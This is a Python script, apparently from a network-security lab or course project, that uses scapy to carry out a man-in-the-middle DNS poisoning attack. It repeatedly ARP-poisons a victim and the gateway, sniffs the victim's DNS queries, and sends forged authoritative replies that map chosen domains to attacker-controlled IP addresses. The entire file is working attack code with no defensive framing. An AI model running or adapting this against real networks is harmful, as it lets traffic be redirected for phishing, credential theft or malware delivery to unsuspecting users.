from scapy.all import *
from arpPoison import *
import time


def getDnsMsg(hwA,hwV,ipV,ipG,urlsToSpoof,interface):

    print("sniffing")
    
    while(True):
        arpPoison(hwA,hwV,ipV,ipG,interface)
        pkt = sniff(count=1,iface=interface,filter="udp port 53", timeout=1)

        if pkt:
            packetFound = checkForDns(pkt[0],ipV,urlsToSpoof)
            if packetFound:
                return packetFound
    
def checkForDns(pkt,ipV,urlsToSpoof):
    
    if pkt.haslayer(DNS):
            dnsQueryFromVictim, goodUrl = getDnsMsgType(pkt,ipV,urlsToSpoof)
            #print("packet found")
            return (pkt, dnsQueryFromVictim, goodUrl)
    else:
        #print("bad packet")
        return ()
    

def getDnsMsgType(pkt,ipV,urlsToSpoof):
    
    if pkt[IP].src == ipV: 
        if urlsToSpoof:
            goodUrl = bool(pkt[IP][DNS].qd.qname in urlsToSpoof.keys())
        else: 
            goodUrl = True
        return (True, goodUrl)
    
    else: 
        return (False, False)

def dnsPoisoning(interface,a,urlsToSpoof):

    hwA = a["attacker MAC"]
    hwV = a["victim MAC"]
    ipV = a["victim IP"]
    ipG = a["gateway IP"]

    print("\nDNS poisoning attack\n")

    while(True):

        try:

            (pkt,dnsQueryFromVictim,goodUrl) = getDnsMsg(hwA,hwV,ipV,ipG,urlsToSpoof,interface)

            if dnsQueryFromVictim and goodUrl:
	
                dnsResponse = dnsForgeResponse(pkt, urlsToSpoof)
                sendp(dnsResponse, iface=interface)
                #print("DNS response sent")

        except KeyboardInterrupt:
            return

    return

def dnsForgeResponse(pkt, urlsToSpoof):

    urlRequested = pkt[DNS].qd.qname

    if urlsToSpoof:
        ipA = urlsToSpoof[urlRequested]

    else:
        ipA = get_if_addr('enp0s9')

    eth = Ether(
	src = pkt[Ether].dst, 
	dst = pkt[Ether].src
	)

    ip = IP(
	src = pkt[IP].dst, 
	dst = pkt[IP].src
	)

    udp = UDP(
	sport = 53, 
	dport = pkt[UDP].sport
	)
    
    dns = DNS(
	id = pkt[DNS].id,
	qd = pkt[DNS].qd,
	aa = 1,
	rd = 0,
	qr = 1,
	qdcount = 1,
	ancount = 1,
	nscount = 0,
	arcount = 0,
	ar = DNSRR(
	    rrname = urlRequested,
	    type = "A",
	    ttl = 600,
	    rdata = ipA
	    )
	)

    return eth / ip / udp / dns
